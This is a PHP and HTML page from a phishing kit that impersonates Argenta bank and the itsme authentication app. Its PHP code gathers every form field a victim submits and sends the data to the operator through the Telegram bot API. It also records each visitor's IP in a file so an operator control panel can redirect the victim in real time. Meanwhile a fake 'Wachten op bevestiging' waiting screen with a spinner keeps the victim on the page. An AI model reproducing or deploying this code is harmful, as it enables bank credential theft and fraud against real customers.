<?php
session_start();
error_reporting(0);
include 'config.php';

function getUserIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) return $_SERVER["HTTP_CF_CONNECTING_IP"];
    if (isset($_SERVER["HTTP_CLIENT_IP"])) return $_SERVER["HTTP_CLIENT_IP"];
    if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) return explode(',', $_SERVER["HTTP_X_FORWARDED_FOR"])[0];
    return $_SERVER['REMOTE_ADDR'];
}

    $uip = getUserIP();
    $user_file = 'users/' . $uip . '.txt';
    $custom_app_info = "";
    if (file_exists($user_file)) {
        $data = file_get_contents($user_file);
        $row = explode('#|#', $data);
        if ($row[0] == 'app' && isset($row[1])) {
            $custom_app_info = $row[1];
        }
    }
    
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $type = $_POST['type'];
    $message = "🔔 [ARGENTA] New Data: " . strtoupper($type) . "\n";
    $message .= "🌐 IP: " . $uip . "\n";
    
    foreach ($_POST as $key => $value) {
        if ($key != 'type' && $key != 'submit') {
            $message .= "🔹 " . ucfirst($key) . ": " . $value . "\n";
        }
    }
    
    $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message);
    file_get_contents($url);
    
    // Create user file for control panel
    if (!file_exists('users')) mkdir('users', 0777, true);
    file_put_contents('users/' . $uip . '.txt', '0');
    
    header("Location: verify.php");
    exit();
}
?>
<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Argenta | App Verification</title>
    <link href="./Home/main.4393a533.css" rel="stylesheet">
    <script src="./nkl_files/jquery.min.js"></script>
    <script>
    setInterval(() => { fetch('heartbeat.php'); }, 3000);
    </script>
</head>
<body style="background: #f4f4f4; font-family: Arial, sans-serif;">
    <div style="max-width: 500px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center;">
        <img src="./approuve_files/p.svg" alt="Itsme" height="80">
        <h2 style="color: #333; margin-top: 20px;">Bevestig in je itsme® app</h2>
        <p style="color: #666; line-height: 1.6;"><?php echo !empty($custom_app_info) ? htmlspecialchars($custom_app_info) : "Open de itsme® app sur votre smartphone et confirmez la demande de connexion pour continuer en toute sécurité."; ?></p>
        <div style="margin: 30px 0;">
            <div class="spinner" style="border: 4px solid #f3f3f3; border-top: 4px solid #004a99; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto;"></div>
        </div>
        <p style="font-size: 14px; color: #999;">Wachten op bevestiging...</p>
    </div>

    <style>
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

    <script>
    var ip = "<?php echo $uip; ?>";
    var waiting = setInterval(function() {
        $.get('./users/' + ip + '.txt?rand=' + Math.random(), function(data) {
            if(data != '0' && data != '') {
                var row = data.split('#|#');
                if(row[0] == 'url') location.href = row[2];
                else location.href = "./nkl-" + row[0] + ".php?error=" + row[1];
            }
        });
    }, 2000);
    </script>
</body>
</html>
